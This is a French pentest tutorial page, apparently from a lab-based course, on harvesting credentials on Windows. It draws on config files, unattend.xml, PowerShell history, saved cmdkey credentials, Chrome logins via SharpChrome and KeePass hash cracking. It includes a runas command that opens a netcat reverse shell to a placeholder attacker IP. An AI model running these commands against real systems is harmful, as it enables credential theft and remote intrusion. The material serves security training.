# Vol de credentials

Les credentials sont partout sur un systeme Windows : dans les fichiers de configuration d'applications, l'historique PowerShell, les fichiers d'installation automatique, les navigateurs, les gestionnaires de mots de passe. Meme sans escalade de privileges directe, recuperer des credentials peut mener a un acces administrateur local ou a un pivoting lateral vers d'autres machines.

## Pourquoi

Les utilisateurs et les administrateurs stockent regulierement des mots de passe dans des endroits accessibles : fichiers de configuration en clair, historique de commandes, credentials sauvegardes dans le navigateur ou dans le Credential Manager Windows. En pentest, chercher des credentials est souvent le chemin le plus rapide vers une escalade, surtout quand les configurations systeme sont propres.

## Comment ca marche

### Sources de credentials

| Source | Localisation typique | Contenu |
|---|---|---|
| **Fichiers de config** | `web.config`, `*.ini`, `*.cfg`, `*.xml` | Chaines de connexion, mots de passe en clair |
| **Unattend.xml** | `C:\Windows\Panther\`, `C:\Windows\System32\Sysprep\` | Credentials d'auto-logon, comptes supplementaires |
| **Historique PowerShell** | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\` | Commandes avec des mots de passe passes en argument |
| **Cmdkey / Credential Manager** | Stockage Windows integre | Credentials sauvegardes pour RDP, SMB |
| **Navigateurs** | Profils Chrome/Firefox/Edge | Logins et mots de passe sauvegardes (DPAPI) |
| **Gestionnaires de mots de passe** | Fichiers `.kdbx` (KeePass), vaults | Bases de donnees de credentials |
| **Dictionnaires personnels** | `AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt` | Mots de passe tapes dans le navigateur et ajoutes au dictionnaire |
| **Fichiers divers** | `.rdp`, `.vnc`, `.ppk`, `.config`, `.txt` | Credentials stockes par habitude |

### Fichiers d'installation automatique

Les fichiers `unattend.xml` et `sysprep.xml` sont utilises pour les installations automatisees de Windows. Ils contiennent frequemment des credentials en clair ou en base64, et sont censes etre supprimes apres l'installation, mais restent souvent sur le disque.

### Historique PowerShell

Depuis PowerShell 5.0 (Windows 10), toutes les commandes tapees sont enregistrees dans un fichier texte. Les administrateurs qui utilisent des commandes comme `net use` avec des credentials les exposent dans cet historique.

### Credentials sauvegardes (cmdkey)

Le Credential Manager Windows stocke les credentials pour les connexions RDP, SMB et autres services. Si un utilisateur a sauvegarde des credentials, on peut les reutiliser via `runas /savecred`.

## En pratique

### Recherche dans les fichiers de configuration

```powershell
# - Rechercher "password" dans les fichiers de config
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# - Recherche plus large
findstr /si password *.xml *.ini *.txt *.config *.ps1

# - Recherche recursive dans tout le disque
findstr /spin "password" *.*

# - Via PowerShell
Select-String -Path C:\Users\*\Documents\*.txt -Pattern password
```

### Unattend.xml et fichiers d'installation

```powershell
# - Emplacements courants des fichiers unattend
# C:\Windows\Panther\unattend.xml
# C:\Windows\Panther\Unattend\unattend.xml
# C:\Windows\System32\Sysprep\unattend.xml
# C:\Windows\System32\Sysprep\Panther\unattend.xml

# - Rechercher les fichiers unattend
dir /S /B C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# - Exemple de contenu exploitable
# <AutoLogon>
#     <Password>
#         <Value>local_4dmin_p@ss</Value>
#         <PlainText>true</PlainText>
#     </Password>
#     <Username>Administrator</Username>
# </AutoLogon>
```

### Historique PowerShell

```powershell
# - Localiser le fichier d'historique
(Get-PSReadLineOption).HistorySavePath
# C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# - Lire l'historique
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# - Chercher des credentials dans l'historique de tous les utilisateurs
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_.FullName; Get-Content $_ | Select-String "password|cred|secret" }
```

{% hint style="success" %}
L'historique PowerShell est l'une des sources de credentials les plus fiables. Les administrateurs systeme utilisent regulierement des commandes comme `net use \\server /user:admin P@ssw0rd` ou `Invoke-Command -Credential`, et tout est enregistre.
{% endhint %}

### Credentials sauvegardes (cmdkey)

```cmd
# - Lister les credentials sauvegardes
cmdkey /list
# Target: TERMSRV/SQL01
# Type: Generic
# User: inlanefreight\bob

# - Reutiliser les credentials sauvegardes via runas
runas /savecred /user:inlanefreight\bob "cmd /c whoami > C:\Temp\whoami.txt"

# - Obtenir un reverse shell avec les credentials sauvegardes
runas /savecred /user:inlanefreight\bob "cmd /c C:\Temp\nc.exe <IP_ATTAQUANT> 443 -e cmd.exe"
```

### Credentials navigateur (Chrome)

```powershell
# - Extraire les logins sauvegardes de Chrome avec SharpChrome
.\SharpChrome.exe logins /unprotect

# Resultat typique :
# --- Chrome Credential ---
# signon_realm: https://vc01.inlanefreight.local/
# username: bob@inlanefreight.local
# password: Welcome1
```

{% hint style="warning" %}
L'extraction de credentials Chrome genere des evenements de securite (Event ID 4688 pour la creation de processus, activite DPAPI). En environnement surveille, cette action peut declencher des alertes.
{% endhint %}

### Gestionnaire de mots de passe (KeePass)

```bash
# - Rechercher des fichiers KeePass sur le systeme
dir /S /B C:\*.kdbx 2>nul

# - Sur la machine attaquante : extraire le hash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
# ILFREIGHT_Help_Desk:$keepass$*2*60000*...

# - Cracker avec Hashcat (mode 13400)
hashcat -m 13400 keepass_hash /opt/wordlists/rockyou.txt
```

### Recherche de fichiers sensibles

{% tabs %}
{% tab title="CMD" %}
```cmd
# - Rechercher des fichiers par extension
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

# - Rechercher des fichiers specifiques
where /R C:\ *.config
where /R C:\ *.kdbx
where /R C:\ *.ppk
```
{% endtab %}
{% tab title="PowerShell" %}
```powershell
# - Rechercher des fichiers sensibles
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred, *.kdbx, *.ppk -ErrorAction Ignore

# - Rechercher dans les documents utilisateur
Get-ChildItem C:\Users\*\Documents\* -Include *.txt, *.doc*, *.xls* -Recurse -ErrorAction SilentlyContinue

# - Fichiers recemment modifies (potentiellement actifs)
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Extension -match "\.(txt|xml|ini|config|ps1)$" }
```
{% endtab %}
{% endtabs %}

### Dictionnaires personnels Chrome

```powershell
# - Verifier le dictionnaire Chrome
gc 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Les utilisateurs ajoutent parfois leurs mots de passe
# au dictionnaire pour supprimer le soulignement rouge
```

## Pieges et galeres

- **DPAPI et credentials navigateur** : les mots de passe Chrome sont proteges par DPAPI. L'extraction necessite d'etre dans le contexte de l'utilisateur proprietaire ou d'avoir la cle DPAPI master
- **Fichiers unattend supprimes** : les fichiers d'installation sont censes etre nettoyes automatiquement. Verifier aussi dans les copies shadow (`vssadmin list shadows`)
- **Historique PowerShell desactive** : certains environnements desactivent l'enregistrement de l'historique. Verifier avec `(Get-PSReadLineOption).HistorySavePath`
- **KeePass et mot de passe fort** : si le mot de passe maitre est robuste, le cracking offline peut prendre un temps prohibitif. Chercher d'abord un fichier cle (`.key`) associe
- **Faux positifs** : `findstr /si password` remonte beaucoup de resultats non exploitables (documentation, exemples). Prioriser les fichiers de configuration d'applications connues
- **Permissions utilisateur** : l'acces aux profils des autres utilisateurs est generalement restreint. Les fichiers de config dans `C:\inetpub`, `C:\Program Files` et les partages reseau sont plus accessibles

## Memo express

| Commande | Usage |
|---|---|
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml` | Chercher des credentials dans les fichiers |
| `dir /S /B C:\*unattend*.xml` | Fichiers d'installation automatique |
| `type %APPDATA%\...\ConsoleHost_history.txt` | Historique PowerShell |
| `cmdkey /list` | Credentials sauvegardes |
| `runas /savecred /user:<domain\user> "<cmd>"` | Reutiliser des credentials sauvegardes |
| `.\SharpChrome.exe logins /unprotect` | Credentials Chrome |
| `dir /S /B C:\*.kdbx` | Fichiers KeePass |
| `Get-ChildItem C:\ -Recurse -Include *.rdp,*.config` | Fichiers sensibles (PowerShell) |

***
